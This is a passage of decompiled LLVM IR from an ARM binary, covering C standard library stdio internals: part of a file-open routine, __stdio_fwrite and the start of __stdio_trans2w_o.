  %v0_19d0c = phi i32 [ %v0_19d0c.pre, %dec_label_pc_19cf4.dec_label_pc_19d0c_crit_edge ], [ %v1_19ce8, %dec_label_pc_19ce8 ]
  %v1_19d0c = and i32 %v0_19d0c, 131072
  store i32 %v1_19d0c, i32* %r3.global-to-local, align 4
  %v2_19d10 = or i32 %v1_19d0c, %v0_19d10
  store i32 %v2_19d10, i32* @r4, align 4
  br label %dec_label_pc_19d3c

dec_label_pc_19d18:                               ; preds = %dec_label_pc_19cc0
  %v7_19d18 = icmp eq i32 %v0_19d18, -1
  %v0_19d24.pre = load i32, i32* @r4, align 4
  br i1 %v7_19d18, label %dec_label_pc_19d18._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_19d18
  %v2_19d1c = or i32 %v0_19d24.pre, ptrtoint ([10 x i8]* @global_var_20000.1573 to i32)
  store i32 %v2_19d1c, i32* @r4, align 4
  br label %dec_label_pc_19d18._crit_edge

dec_label_pc_19d18._crit_edge:                    ; preds = %dec_label_pc_19d18, %bb38
  %v0_19d24 = phi i32 [ %v2_19d1c, %bb38 ], [ %v0_19d24.pre, %dec_label_pc_19d18 ]
  %v0_19d20 = load i32, i32* @r6, align 4
  store i32 %v0_19d20, i32* %r0.global-to-local, align 4
  store i32 %v0_19d24, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_19d2c = call i32 @__GI_open(i32 %v0_19d20, i32 %v0_19d24)
  store i32 %v2_19d2c, i32* %r0.global-to-local, align 4
  %v1_19d30 = icmp slt i32 %v2_19d2c, 0
  %v1_19d34 = load i32, i32* @sb, align 4
  %v2_19d34 = add i32 %v1_19d34, 4
  %v3_19d34 = inttoptr i32 %v2_19d34 to i32*
  store i32 %v2_19d2c, i32* %v3_19d34, align 4
  br i1 %v1_19d30, label %dec_label_pc_19c54, label %.dec_label_pc_19d3c_crit_edge

.dec_label_pc_19d3c_crit_edge:                    ; preds = %dec_label_pc_19d18._crit_edge
  %v0_19d40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d3c

dec_label_pc_19d3c:                               ; preds = %.dec_label_pc_19d3c_crit_edge, %dec_label_pc_19d0c
  %v0_19d58 = phi i32 [ %v0_19d40.pre, %.dec_label_pc_19d3c_crit_edge ], [ %v2_19d10, %dec_label_pc_19d0c ]
  %v0_19d3c = load i32, i32* @sb, align 4
  %v1_19d3c = inttoptr i32 %v0_19d3c to i16*
  %v2_19d3c = load i16, i16* %v1_19d3c, align 2
  %v3_19d3c = zext i16 %v2_19d3c to i32
  %v1_19d40 = urem i32 %v0_19d58, 4
  %v1_19d44 = and i32 %v0_19d58, 1024
  %v1_19d48 = and i32 %v3_19d3c, 8192
  %v1_19d4c = add nuw nsw i32 %v1_19d40, 1
  %v2_19d50 = or i32 %v1_19d48, %v1_19d44
  store i32 %v2_19d50, i32* %r3.global-to-local, align 4
  %v1_19d54 = xor i32 %v1_19d4c, 3
  store i32 %v1_19d54, i32* %r1.global-to-local, align 4
  %v1_19d58 = and i32 %v0_19d58, ptrtoint ([10 x i8]* @global_var_20000.1573 to i32)
  store i32 %v1_19d58, i32* %r2.global-to-local, align 4
  %v2_19d58 = icmp eq i32 %v1_19d58, 0
  %v1_19d5c = add i32 %v0_19d3c, 4
  %v2_19d5c = inttoptr i32 %v1_19d5c to i32*
  %v3_19d5c = load i32, i32* %v2_19d5c, align 4
  store i32 %v3_19d5c, i32* @r5, align 4
  br i1 %v2_19d58, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_19d3c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_19d3c, %bb39
  %v0_19d68 = phi i32 [ 0, %dec_label_pc_19d3c ], [ 32768, %bb39 ]
  %v4_19d64 = mul nuw nsw i32 %v1_19d54, 16
  %v5_19d64 = or i32 %v2_19d50, %v4_19d64
  store i32 %v5_19d64, i32* %r3.global-to-local, align 4
  %v2_19d68 = or i32 %v0_19d68, %v5_19d64
  store i32 %v2_19d68, i32* %r2.global-to-local, align 4
  %v8_19d6c = icmp eq i32 %v3_19d5c, 2147483647
  %v1_19d70 = trunc i32 %v2_19d68 to i16
  store i16 %v1_19d70, i16* %v1_19d3c, align 2
  br i1 %v8_19d6c, label %dec_label_pc_19da0, label %dec_label_pc_19d78

dec_label_pc_19d78:                               ; preds = %bb40
  %v0_19d78 = call i32 @__GI___errno_location()
  store i32 %v0_19d78, i32* @r4, align 4
  %v0_19d80 = load i32, i32* @r5, align 4
  store i32 %v0_19d80, i32* @r0, align 4
  %v1_19d84 = inttoptr i32 %v0_19d78 to i32*
  %v2_19d84 = load i32, i32* %v1_19d84, align 4
  store i32 %v2_19d84, i32* @r5, align 4
  %v1_19d88 = call i32 @isatty(i32 %v0_19d80)
  store i32 %v1_19d88, i32* %r0.global-to-local, align 4
  %v2_19d8c = icmp eq i32 %v1_19d88, 0
  br i1 %v2_19d8c, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_19d78
  %v1_19d90 = load i32, i32* @sb, align 4
  %v2_19d90 = inttoptr i32 %v1_19d90 to i16*
  %v3_19d90 = load i16, i16* %v2_19d90, align 2
  %v4_19d90 = zext i16 %v3_19d90 to i32
  %v2_19d94 = or i32 %v4_19d90, 256
  store i32 %v2_19d94, i32* %r3.global-to-local, align 4
  %v2_19d98 = trunc i32 %v2_19d94 to i16
  store i16 %v2_19d98, i16* %v2_19d90, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19d78, %bb41
  %v0_19d9c = load i32, i32* @r5, align 4
  %v1_19d9c = load i32, i32* @r4, align 4
  %v2_19d9c = inttoptr i32 %v1_19d9c to i32*
  store i32 %v0_19d9c, i32* %v2_19d9c, align 4
  br label %dec_label_pc_19da0

dec_label_pc_19da0:                               ; preds = %bb40, %.thread7
  %v0_19da0 = load i32, i32* @sb, align 4
  %v1_19da0 = add i32 %v0_19da0, 8
  %v2_19da0 = inttoptr i32 %v1_19da0 to i32*
  %v3_19da0 = load i32, i32* %v2_19da0, align 4
  store i32 %v3_19da0, i32* %r3.global-to-local, align 4
  %v2_19da4 = icmp eq i32 %v3_19da0, 0
  br i1 %v2_19da4, label %dec_label_pc_19dac, label %bb42

dec_label_pc_19dac:                               ; preds = %dec_label_pc_19da0
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_19db0 = call i32 @malloc(i32 4096)
  store i32 %v1_19db0, i32* %r0.global-to-local, align 4
  %v2_19db4 = icmp eq i32 %v1_19db0, 0
  %v1_19dc4.pre = load i32, i32* @sb, align 4
  br i1 %v2_19db4, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19dac
  %v2_19db8 = inttoptr i32 %v1_19dc4.pre to i16*
  %v3_19db8 = load i16, i16* %v2_19db8, align 2
  %v4_19db8 = zext i16 %v3_19db8 to i32
  %v2_19dbc = add i32 %v1_19db0, 4096
  store i32 %v2_19dbc, i32* %r2.global-to-local, align 4
  %v2_19dc0 = or i32 %v4_19db8, 16384
  store i32 %v2_19dc0, i32* %r3.global-to-local, align 4
  %v2_19dc4 = add i32 %v1_19dc4.pre, 8
  %v3_19dc4 = inttoptr i32 %v2_19dc4 to i32*
  store i32 %v1_19db0, i32* %v3_19dc4, align 4
  %v1_19dc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_19dc8 = load i32, i32* @sb, align 4
  %v3_19dc8 = add i32 %v2_19dc8, 12
  %v4_19dc8 = inttoptr i32 %v3_19dc8 to i32*
  store i32 %v1_19dc8, i32* %v4_19dc8, align 4
  %v1_19dcc = load i32, i32* %r3.global-to-local, align 4
  %v2_19dcc = trunc i32 %v1_19dcc to i16
  %v3_19dcc = load i32, i32* @sb, align 4
  %v4_19dcc = inttoptr i32 %v3_19dcc to i16*
  store i16 %v2_19dcc, i16* %v4_19dcc, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_19dac
  %v2_19dc421 = add i32 %v1_19dc4.pre, 8
  %v3_19dc422 = inttoptr i32 %v2_19dc421 to i32*
  store i32 0, i32* %v3_19dc422, align 4
  %v2_19dd0 = load i32, i32* @sb, align 4
  %v3_19dd0 = add i32 %v2_19dd0, 12
  %v4_19dd0 = inttoptr i32 %v3_19dd0 to i32*
  store i32 0, i32* %v4_19dd0, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_19da0, %.thread11
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_19ddc = load i32, i32* @fp, align 4
  %v2_19ddc = add i32 %v0_19ddc, 64
  %v3_19ddc = inttoptr i32 %v2_19ddc to i32*
  %v4_19ddc = load i32, i32* %v3_19ddc, align 4
  store i32 %v4_19ddc, i32* %r3.global-to-local, align 4
  %v2_19de0 = load i32, i32* @sb, align 4
  %v3_19de0 = add i32 %v2_19de0, 2
  %v4_19de0 = inttoptr i32 %v3_19de0 to i8*
  store i8 0, i8* %v4_19de0, align 1
  %v0_19de4 = load i32, i32* @sb, align 4
  %v1_19de4 = inttoptr i32 %v0_19de4 to i16*
  %v2_19de4 = load i16, i16* %v1_19de4, align 2
  %v3_19de4 = zext i16 %v2_19de4 to i32
  store i32 %v3_19de4, i32* @r2, align 4
  %v0_19de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19de8 = inttoptr i32 %v0_19de8 to i32*
  %v2_19de8 = load i32, i32* %v1_19de8, align 4
  store i32 %v2_19de8, i32* %r1.global-to-local, align 4
  %v1_19dec = add i32 %v0_19de4, 8
  %v2_19dec = inttoptr i32 %v1_19dec to i32*
  %v3_19dec = load i32, i32* %v2_19dec, align 4
  store i32 %v3_19dec, i32* %r3.global-to-local, align 4
  %v1_19df0 = and i32 %v3_19de4, 8192
  %v2_19df0 = icmp eq i32 %v1_19df0, 0
  %v2_19df4 = add i32 %v0_19de4, 20
  %v3_19df4 = inttoptr i32 %v2_19df4 to i32*
  store i32 %v3_19dec, i32* %v3_19df4, align 4
  %v0_19df8 = load i32, i32* %r0.global-to-local, align 4
  %v1_19df8 = load i32, i32* @sb, align 4
  %v2_19df8 = add i32 %v1_19df8, 44
  %v3_19df8 = inttoptr i32 %v2_19df8 to i32*
  store i32 %v0_19df8, i32* %v3_19df8, align 4
  %v0_19dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_19dfc = load i32, i32* @sb, align 4
  %v2_19dfc = add i32 %v1_19dfc, 52
  %v3_19dfc = inttoptr i32 %v2_19dfc to i32*
  store i32 %v0_19dfc, i32* %v3_19dfc, align 4
  %v0_19e00 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e00 = load i32, i32* @sb, align 4
  %v2_19e00 = add i32 %v1_19e00, 24
  %v3_19e00 = inttoptr i32 %v2_19e00 to i32*
  store i32 %v0_19e00, i32* %v3_19e00, align 4
  %v0_19e04 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e04 = load i32, i32* @sb, align 4
  %v2_19e04 = add i32 %v1_19e04, 28
  %v3_19e04 = inttoptr i32 %v2_19e04 to i32*
  store i32 %v0_19e04, i32* %v3_19e04, align 4
  %v0_19e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e08 = load i32, i32* @sb, align 4
  %v2_19e08 = add i32 %v1_19e08, 16
  %v3_19e08 = inttoptr i32 %v2_19e08 to i32*
  store i32 %v0_19e08, i32* %v3_19e08, align 4
  br i1 %v2_19df0, label %dec_label_pc_19ec4, label %dec_label_pc_19e10

dec_label_pc_19e10:                               ; preds = %bb42
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_19e14 = load i32, i32* @fp, align 4
  %v2_19e14 = add i32 %v0_19e14, 40
  %v3_19e14 = inttoptr i32 %v2_19e14 to i32*
  %v4_19e14 = load i32, i32* %v3_19e14, align 4
  store i32 %v4_19e14, i32* %r8.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_19e1c = add i32 %v0_19e14, 120
  %v3_19e1c = inttoptr i32 %v2_19e1c to i32*
  %v4_19e1c = load i32, i32* %v3_19e1c, align 4
  store i32 %v4_19e1c, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_19e24 = ptrtoint i32* %stack_var_-56 to i32
  %v2_19e28 = add i32 %v0_19e14, 80
  %v3_19e28 = inttoptr i32 %v2_19e28 to i32*
  %v4_19e28 = load i32, i32* %v3_19e28, align 4
  store i32 %v4_19e14, i32* %r1.global-to-local, align 4
  store i32 %v4_19e1c, i32* %r2.global-to-local, align 4
  store i32 %v2_19e24, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e28)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_19e44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19e44, i32* %r0.global-to-local, align 4
  %v0_19e48 = load i32, i32* @fp, align 4
  %v2_19e48 = add i32 %v0_19e48, 20
  %v3_19e48 = inttoptr i32 %v2_19e48 to i32*
  %v4_19e48 = load i32, i32* %v3_19e48, align 4
  call void @__pseudo_branch(i32 %v4_19e48)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_19e58 = load i32, i32* @fp, align 4
  %v2_19e58 = add i32 %v0_19e58, 108
  %v3_19e58 = inttoptr i32 %v2_19e58 to i32*
  %v4_19e58 = load i32, i32* %v3_19e58, align 4
  store i32 %v4_19e58, i32* %r4.global-to-local, align 4
  %v0_19e5c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_19e5c, i32* %r1.global-to-local, align 4
  store i32 %v4_19e58, i32* %r2.global-to-local, align 4
  store i32 %v2_19c14, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e28)
  store i32 %v4_19e58, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e48)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_19e80 = load i32, i32* @fp, align 4
  %v2_19e80 = add i32 %v0_19e80, 52
  %v3_19e80 = inttoptr i32 %v2_19e80 to i32*
  %v4_19e80 = load i32, i32* %v3_19e80, align 4
  store i32 %v4_19e80, i32* @ip, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v1_19e88 = inttoptr i32 %v4_19e80 to i32*
  %v2_19e88 = load i32, i32* %v1_19e88, align 4
  store i32 %v2_19e88, i32* @r2, align 4
  store i32 %v2_19c14, i32* %r0.global-to-local, align 4
  %v1_19e90 = load i32, i32* @sb, align 4
  %v2_19e90 = add i32 %v1_19e90, 32
  %v3_19e90 = inttoptr i32 %v2_19e90 to i32*
  store i32 %v2_19e88, i32* %v3_19e90, align 4
  %v0_19e94 = load i32, i32* @fp, align 4
  %v1_19e94 = load i32, i32* %r3.global-to-local, align 4
  %v2_19e94 = add i32 %v1_19e94, %v0_19e94
  %v3_19e94 = inttoptr i32 %v2_19e94 to i32*
  %v4_19e94 = load i32, i32* %v3_19e94, align 4
  store i32 %v4_19e94, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_19e9c = load i32, i32* @sb, align 4
  %v1_19e9c = load i32, i32* @ip, align 4
  %v2_19e9c = inttoptr i32 %v1_19e9c to i32*
  store i32 %v0_19e9c, i32* %v2_19e9c, align 4
  call void @__pseudo_branch(i32 %v4_19e94)
  store i32 %v2_19e24, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e94)
  br label %dec_label_pc_19ec4

dec_label_pc_19ec0:                               ; preds = %dec_label_pc_19c54, %dec_label_pc_19c40, %dec_label_pc_19c60
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_19ec4

dec_label_pc_19ec4:                               ; preds = %bb42, %dec_label_pc_19c98, %dec_label_pc_19e10, %dec_label_pc_19ec0
  %v0_19ec4 = load i32, i32* @sb, align 4
  store i32 %v0_19ec4, i32* %r0.global-to-local, align 4
  %v2_19ecc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19ecc, i32* @r4, align 4
  store i32 %v6_19c00, i32* @r5, align 4
  store i32 %v9_19c00, i32* @r6, align 4
  store i32 %v18_19c00, i32* @sb, align 4
  store i32 %v24_19c00, i32* @fp, align 4
  ret i32 %v0_19ec4

; uselistorder directives
  uselistorder i32 %v1_19dc4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_19d58, { 1, 2, 0 }
  uselistorder i32 %v0_19d24, { 1, 0 }
  uselistorder i32 %v1_19ce8, { 1, 0 }
  uselistorder i32 %v0_19ce8, { 1, 0 }
  uselistorder i32 %v1_19cd0, { 1, 0, 2 }
  uselistorder i32 %v1_19c88, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i32 16384, { 12, 11, 0, 1, 6, 4, 5, 2, 3, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @isatty, { 0, 2, 1 }
  uselistorder i32 2147483647, { 0, 1, 6, 2, 5, 3, 4 }
  uselistorder i32 (i32, i32)* @__GI_open, { 3, 0, 4, 2, 1 }
  uselistorder i32 131072, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 10, 0, 9, 8, 7, 6, 14, 13, 12, 11, 5, 4, 3, 2 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 0, 4, 3, 2, 1 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_19ec4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_19ec0, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19da0, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_19d18._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19cc0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_19c70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19c40, { 1, 2, 0 }
}

define i32 @function_19ed8(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_19ed8:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_19ed8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19ed8, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_19ed8
  %v3_19ee0 = and i32 %arg4, %arg3
  %v2_19ee4 = trunc i32 %v3_19ee0 to i16
  %v4_19ee4 = inttoptr i32 %v3_19ee0 to i16*
  store i16 %v2_19ee4, i16* %v4_19ee4, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19ed8, %bb
  %v10_19f04 = phi i32 [ %tmp, %dec_label_pc_19ed8 ], [ 0, %bb ]
  ret i32 %v10_19f04

; uselistorder directives
  uselistorder i32 %v3_19ee0, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_19f08 = load i32, i32* @r4, align 4
  store i32 %v3_19f08, i32* %stack_var_-20, align 4
  %v6_19f08 = load i32, i32* @r5, align 4
  %v9_19f08 = load i32, i32* @r6, align 4
  %v12_19f08 = load i32, i32* @r7, align 4
  %v3_19f0c = load i16, i16* %arg3, align 2
  %v4_19f0c = zext i16 %v3_19f0c to i32
  %v1_19f10 = and i32 %v4_19f0c, 512
  store i32 %v1_19f10, i32* @r4, align 4
  %v2_19f10 = icmp eq i32 %v1_19f10, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_19f10, label %dec_label_pc_19f28, label %dec_label_pc_1a024

dec_label_pc_19f28:                               ; preds = %entry
  %v2_19f28 = add i32 %tmp, 4
  %v3_19f28 = inttoptr i32 %v2_19f28 to i32*
  %v4_19f28 = load i32, i32* %v3_19f28, align 4
  %v2_19f30 = add i32 %tmp, 16
  %v3_19f30 = inttoptr i32 %v2_19f30 to i32*
  %v4_19f30 = load i32, i32* %v3_19f30, align 4
  store i32 %v4_19f30, i32* @r0, align 4
  %v2_19f34 = add i32 %tmp, 12
  %v3_19f34 = inttoptr i32 %v2_19f34 to i32*
  %v4_19f34 = load i32, i32* %v3_19f34, align 4
  store i32 %v4_19f34, i32* @r3, align 4
  %v4_19f38 = icmp eq i32 %v4_19f28, -2
  %v2_19f3c = sub i32 %v4_19f34, %v4_19f30
  br i1 %v4_19f38, label %dec_label_pc_19f3c, label %dec_label_pc_19f64

dec_label_pc_19f3c:                               ; preds = %dec_label_pc_19f28
  %v3_19f40 = icmp ugt i32 %v2_19f3c, %arg2
  br i1 %v3_19f40, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_19f3c
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_19f3c, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_19f3c, %dec_label_pc_19f3c ]
  %v0_19f48 = phi i32 [ %arg2, %bb ], [ %v2_19f3c, %dec_label_pc_19f3c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_19f48, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19f50 = call i32 @memcpy()
  %v0_19f54 = load i32, i32* @r5, align 4
  %v1_19f54 = add i32 %v0_19f54, 16
  %v2_19f54 = inttoptr i32 %v1_19f54 to i32*
  %v3_19f54 = load i32, i32* %v2_19f54, align 4
  %v1_19f58 = load i32, i32* @r4, align 4
  %v2_19f58 = add i32 %v1_19f58, %v3_19f54
  store i32 %v2_19f58, i32* %v2_19f54, align 4
  br label %dec_label_pc_1a038

dec_label_pc_19f64:                               ; preds = %dec_label_pc_19f28
  store i32 %v2_19f3c, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_19f3c, %arg2
  br i1 %tmp18, label %dec_label_pc_1a004, label %dec_label_pc_19f70

dec_label_pc_19f70:                               ; preds = %dec_label_pc_19f64
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19f78 = call i32 @memcpy()
  %v0_19f7c = load i32, i32* @r5, align 4
  %v1_19f7c = add i32 %v0_19f7c, 16
  %v2_19f7c = inttoptr i32 %v1_19f7c to i32*
  %v3_19f7c = load i32, i32* %v2_19f7c, align 4
  %v1_19f80 = inttoptr i32 %v0_19f7c to i16*
  %v2_19f80 = load i16, i16* %v1_19f80, align 2
  %v1_19f84 = load i32, i32* @r6, align 4
  %v2_19f84 = add i32 %v1_19f84, %v3_19f7c
  %v1_19f88 = and i16 %v2_19f80, 256
  %v2_19f88 = icmp eq i16 %v1_19f88, 0
  store i32 %v2_19f84, i32* %v2_19f7c, align 4
  br i1 %v2_19f88, label %dec_label_pc_1a038, label %dec_label_pc_19f94

dec_label_pc_19f94:                               ; preds = %dec_label_pc_19f70
  %v0_19f94 = load i32, i32* @r7, align 4
  %v0_19f9c = load i32, i32* @r6, align 4
  %v4_19fa0 = call i32 @memrchr(i32 %v0_19f94, i32 10, i32 %v0_19f9c, i32 %v2_19f84)
  %v2_19fa4 = icmp eq i32 %v4_19fa0, 0
  br i1 %v2_19fa4, label %dec_label_pc_1a038, label %dec_label_pc_19fac

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19f94
  %v0_19fac = load i32, i32* @r5, align 4
  store i32 %v0_19fac, i32* @r0, align 4
  %v0_19fb0 = call i32 @__stdio_wcommit()
  %v2_19fb4 = icmp eq i32 %v0_19fb0, 0
  br i1 %v2_19fb4, label %dec_label_pc_1a038, label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19fac
  %v1_19fbc = load i32, i32* @r6, align 4
  %v3_19fbc = icmp uge i32 %v0_19fb0, %v1_19fbc
  %v1_19fbc.v0_19fb0 = select i1 %v3_19fbc, i32 %v1_19fbc, i32 %v0_19fb0
  store i32 %v1_19fbc.v0_19fb0, i32* @r4, align 4
  %v2_19fc8 = sub i32 %v1_19fbc, %v1_19fbc.v0_19fb0
  %v0_19fcc = load i32, i32* @r7, align 4
  %v2_19fcc = add i32 %v0_19fcc, %v2_19fc8
  store i32 %v2_19fcc, i32* %r7.global-to-local, align 4
  store i32 %v2_19fcc, i32* @r0, align 4
  store i32 %v1_19fbc.v0_19fb0, i32* @r2, align 4
  %v4_19fdc = call i32 @__GI_memchr(i32 %v2_19fcc, i32 10, i32 %v1_19fbc.v0_19fb0, i32 %v2_19fc8)
  %v2_19fe0 = icmp eq i32 %v4_19fdc, 0
  br i1 %v2_19fe0, label %dec_label_pc_1a038, label %dec_label_pc_19fe8

dec_label_pc_19fe8:                               ; preds = %dec_label_pc_19fbc
  %v0_19fe8 = load i32, i32* @r5, align 4
  %v1_19fe8 = add i32 %v0_19fe8, 16
  %v2_19fe8 = inttoptr i32 %v1_19fe8 to i32*
  %v3_19fe8 = load i32, i32* %v2_19fe8, align 4
  %v0_19fec = load i32, i32* %r7.global-to-local, align 4
  %v1_19fec = load i32, i32* @r4, align 4
  %v2_19fec = sub i32 %v0_19fec, %v4_19fdc
  %v2_19ff0 = add i32 %v2_19fec, %v1_19fec
  %v2_19ff4 = sub i32 %v3_19fe8, %v2_19ff0
  %v1_19ff8 = load i32, i32* @r6, align 4
  %v2_19ff8 = sub i32 %v1_19ff8, %v2_19ff0
  store i32 %v2_19ff8, i32* @r6, align 4
  store i32 %v2_19ff4, i32* %v2_19fe8, align 4
  br label %dec_label_pc_1a038

dec_label_pc_1a004:                               ; preds = %dec_label_pc_19f64
  %v2_1a004 = add i32 %tmp, 8
  %v3_1a004 = inttoptr i32 %v2_1a004 to i32*
  %v4_1a004 = load i32, i32* %v3_1a004, align 4
  %v9_1a008 = icmp eq i32 %v4_19f30, %v4_1a004
  br i1 %v9_1a008, label %dec_label_pc_1a024, label %dec_label_pc_1a010

dec_label_pc_1a010:                               ; preds = %dec_label_pc_1a004
  store i32 %tmp, i32* @r0, align 4
  %v0_1a014 = call i32 @__stdio_wcommit()
  %v2_1a018 = icmp eq i32 %v0_1a014, 0
  br i1 %v2_1a018, label %dec_label_pc_1a010.dec_label_pc_1a024_crit_edge, label %bb15

dec_label_pc_1a010.dec_label_pc_1a024_crit_edge:  ; preds = %dec_label_pc_1a010
  %v0_1a024.pre = load i32, i32* @r6, align 4
  %v0_1a028.pre = load i32, i32* @r5, align 4
  %v0_1a02c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a024

bb15:                                             ; preds = %dec_label_pc_1a010
  %v1_1a01c = load i32, i32* @r4, align 4
  store i32 %v1_1a01c, i32* @r6, align 4
  br label %dec_label_pc_1a038

dec_label_pc_1a024:                               ; preds = %dec_label_pc_1a010.dec_label_pc_1a024_crit_edge, %entry, %dec_label_pc_1a004
  %v0_1a02c = phi i32 [ %v0_1a02c.pre, %dec_label_pc_1a010.dec_label_pc_1a024_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1a004 ]
  %v0_1a028 = phi i32 [ %v0_1a028.pre, %dec_label_pc_1a010.dec_label_pc_1a024_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1a004 ]
  %v0_1a024 = phi i32 [ %v0_1a024.pre, %dec_label_pc_1a010.dec_label_pc_1a024_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1a004 ]
  %v1_1a028 = inttoptr i32 %v0_1a028 to i16*
  %v5_1a030 = call i32 @__stdio_WRITE(i16* %v1_1a028, i32 %v0_1a02c, i32 %v0_1a024)
  store i32 %v5_1a030, i32* @r6, align 4
  br label %dec_label_pc_1a038

dec_label_pc_1a038:                               ; preds = %bb15, %dec_label_pc_19fbc, %dec_label_pc_19fac, %dec_label_pc_19f94, %dec_label_pc_19f70, %dec_label_pc_19fe8, %bb12, %dec_label_pc_1a024
  %v0_1a038 = load i32, i32* @r6, align 4
  %v2_1a040 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1a040, i32* @r4, align 4
  store i32 %v6_19f08, i32* @r5, align 4
  store i32 %v9_19f08, i32* @r6, align 4
  store i32 %v12_19f08, i32* @r7, align 4
  ret i32 %v0_1a038

; uselistorder directives
  uselistorder i32 %v2_19ff0, { 1, 0 }
  uselistorder i32 %v2_19fc8, { 1, 0 }
  uselistorder i32 %v1_19fbc.v0_19fb0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_19fbc, { 1, 0, 2 }
  uselistorder i32 %v2_19f3c, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_1a038, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1a024, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a048 = load i32, i32* @r4, align 4
  store i32 %v3_1a048, i32* %stack_var_-8, align 4
